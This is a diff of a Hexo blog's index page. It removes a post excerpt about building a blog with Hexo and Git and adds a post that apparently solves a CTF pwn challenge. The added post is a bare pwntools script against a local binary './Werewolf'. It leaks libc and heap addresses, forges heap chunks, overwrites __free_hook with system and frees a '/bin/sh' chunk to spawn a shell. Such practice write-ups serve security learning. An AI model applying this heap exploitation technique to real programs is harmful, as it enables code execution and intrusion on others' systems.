@@ -131,58 +131,6 @@
       <div class="body-wrap">
         
   
-    <article id="post-使用Hexo-Ghuhub搭建个人博客" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/07/使用Hexo-Ghuhub搭建个人博客/">使用Hexo+Git搭建个人博客</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备:"></a>安装准备:</h2><p>1.Node.js、Git、Github<br>2.本地搭建Hexo框架，本地服务器测试，配置主题，修改参数等等<br>3.本地Git+Hex与Github关联</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/11/07/使用Hexo-Ghuhub搭建个人博客/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/11/07/使用Hexo-Ghuhub搭建个人博客/" class="archive-article-date">
-  	<time datetime="2016-11-07T02:36:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-07</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hexo/">Hexo</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
     <article id="post-看雪CTF-2016第一题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -320,6 +268,74 @@
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
 		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-一道doublefree的pwn" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/29/一道doublefree的pwn/">一道double的pwn练习</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="/image/一道doublefree的pwn/doublefree">doublefree</a></p>
+<p>from pwn import * </p>
+<p>p = process(‘./Werewolf’)<br>libc = ELF(‘./libc.so’)<br>elf = ELF(‘./Werewolf’)</p>
+<p>def add(sz, content):<br>    p.sendlineafter(“5.Exit\n”, “1”)<br>    p.sendlineafter(“size:\n”, str(sz))<br>    p.sendafter(“action:\n”, content)<br>def show(idx):<br>    p.sendlineafter(“5.Exit\n”, “2”)<br>    p.sendlineafter(“id\n”, str(idx))<br>def edit(idx, content):<br>    p.sendlineafter(“5.Exit\n”, “3”)<br>    p.sendlineafter(“id\n”, str(idx))<br>    p.sendafter(“action\n”, content)<br>def kill(idx):<br>    p.sendlineafter(“5.Exit\n”, “4”)<br>    p.sendlineafter(“id\n”, str(idx))</p>
+<p>add(0x60, ‘/bin/sh\x00\n’)<br>add(0x100, ‘b’<em>0x100)<br>add(0x100,  ‘c’</em>0x100)<br>add(0x100, ‘d’<em>0x100)<br>add(0x100, ‘e’</em>0x100)</p>
+<p>raw_input(‘<strong><strong><strong>__</strong></strong></strong>kill 1’)<br>kill(1)</p>
+<p>raw_input(‘<strong><strong><strong>___</strong></strong></strong>kill 3’)<br>kill(3)</p>
+<p>raw_input(‘<strong><strong><em>__</em></strong></strong>show 1’)<br>show(1)<br>p.recvuntil(“action : “)<br>main_arena = u64(p.recvuntil(“\n”, drop = True).ljust(8, “\x00”)) - 88<br>log.info(“leak : main_arena “ + hex(main_arena))</p>
+<p>raw_input(‘<strong><strong><strong>_</strong></strong></strong>show3’)<br>show(3)<br>p.recvuntil(“action : “)<br>heap = u64(p.recvuntil(“\n”, drop = True).ljust(8, “\x00”))<br>log.info(“leak : heap “ + hex(heap))</p>
+<p>off_main_arena = 0x3c1760<br>free_hook = main_arena - off_main_arena + libc.symbols[“__free_hook”]</p>
+<p>system = main_arena - off_main_arena + libc.symbols[“system”]<br>log.info(“free_hook : “ + hex(free_hook))<br>log.info(“system : “ + hex(system))</p>
+<p>#system_addr - main_arena = libc.symbols[‘system’] - off_main_arena</p>
+<p>#gdb.attach(proc.pidof(p)[0], ‘b *0x555555554eab’)<br>raw_input(‘<strong><strong><strong><em>__</em></strong></strong></strong>kill2’)<br>kill(2)</p>
+<p>raw_input(‘<strong><strong>__</strong></strong>add’)<br>payload  = “f”<em>0x110 + p64(0) + p64(0x100) + p64(heap - 0xF8) + p64(heap - 0xF0)<br>payload += “f”</em>0xE0 + p64(0x100) + p64(0x90) + “f”*0x80 + p64(0) + p64(0x101) + “\n”<br>add(0x300, payload)  # 5</p>
+<p>gdb.attach(proc.pidof(p)[0], ‘b *0x555555554eab’)<br>raw_input(‘<strong><strong>__</strong></strong>kill3’)<br>kill(3)</p>
+<p>raw_input(“<strong><strong>__</strong></strong>edit2”)<br>edit(2, p64(0x60) + p64(free_hook) + “\n”)</p>
+<p>raw_input(“<strong><strong>_</strong></strong>edit1”)<br>edit(1, p64(system) + “\n”)</p>
+<p>raw_input(‘<strong><strong>__</strong></strong>kill’)<br>kill(0)</p>
+<p>p.interactive()</p>
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/08/29/一道doublefree的pwn/" class="archive-article-date">
+  	<time datetime="2016-08-29T11:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-08-29</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
 	</div>
 
       
